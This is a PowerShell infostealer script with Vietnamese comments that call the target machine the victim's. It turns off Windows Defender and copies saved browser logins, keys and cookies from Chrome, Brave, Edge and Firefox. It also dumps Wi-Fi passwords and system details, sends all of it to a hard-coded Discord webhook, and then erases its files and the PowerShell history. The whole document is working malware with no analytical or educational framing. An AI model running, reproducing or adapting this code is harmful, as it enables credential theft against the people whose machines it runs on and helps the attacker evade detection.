#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Thư mục tạm trên máy nạn nhân
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Tắt Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "$env:TEMP\"
Set-MpPreference -ExclusionExtension "ps1"

# ==========================================
# DISCORD WEBHOOK FUNCTION
# ==========================================
function Send-DiscordFile {
    param([string]$FilePath, [string]$Description = "")
    if (-Not (Test-Path $FilePath)) { return }
    try {
        $fileName = Split-Path $FilePath -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $base64Content = [Convert]::ToBase64String($fileBytes)
        $payload = @{
            content = $Description
            files = @(@{ name = $fileName; content = $base64Content })
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

# Function to copy browser files (đã sửa lỗi lock)
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir -Force
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            # Xử lý file bị lock
            $tempFile = "$env:TEMP\$([Guid]::NewGuid()).tmp"
            cmd /c "copy `"$source`" `"$tempFile`"" 2>nul
            if (Test-Path $tempFile) {
                Copy-Item $tempFile (Join-Path -Path $browserDestDir -ChildPath $file) -Force
                Remove-Item $tempFile -Force
                Write-Host "$browserName - File copied: $file"
            } else {
                Copy-Item -Path $source -Destination $browserDestDir -Force
                Write-Host "$browserName - File copied: $file"
            }
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Gather additional system information
function GatherSystemInfo {
    $sysInfoDir = "$destDir\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir -Force
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}
GatherSystemInfo

# Retrieve Wi-Fi passwords
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()
    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }
    $results | Format-Table -AutoSize
    $results | Out-File -FilePath "$destDir\WiFi_Details.txt"
}
GetWifiPasswords

# ==========================================
# GỬI TOÀN BỘ DỮ LIỆU QUA DISCORD
# ==========================================

# Gửi WiFi passwords
Send-DiscordFile -FilePath "$destDir\WiFi_Details.txt" -Description "📡 WiFi Passwords"

# Gửi System Info
Send-DiscordFile -FilePath "$destDir\SystemInfo\computer_info.txt" -Description "💻 Computer Info"
Send-DiscordFile -FilePath "$destDir\SystemInfo\process_list.txt" -Description "📋 Process List"
Send-DiscordFile -FilePath "$destDir\SystemInfo\service_list.txt" -Description "🔧 Service List"
Send-DiscordFile -FilePath "$destDir\SystemInfo\network_config.txt" -Description "🌐 Network Config"

# Gửi browser data
$browsers = @("Chrome", "Brave", "Firefox", "Edge")
foreach ($browser in $browsers) {
    $browserDir = Join-Path -Path $destDir -ChildPath $browser
    if (Test-Path $browserDir) {
        $zipPath = "$env:TEMP\$browser.zip"
        Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
        Send-DiscordFile -FilePath $zipPath -Description "🌐 $browser Credentials"
        Remove-Item $zipPath -Force
    }
}

# ==========================================
# DỌN DẸP
# ==========================================

# Xóa thư mục tạm
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue

# Xóa lịch sử PowerShell
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

exit
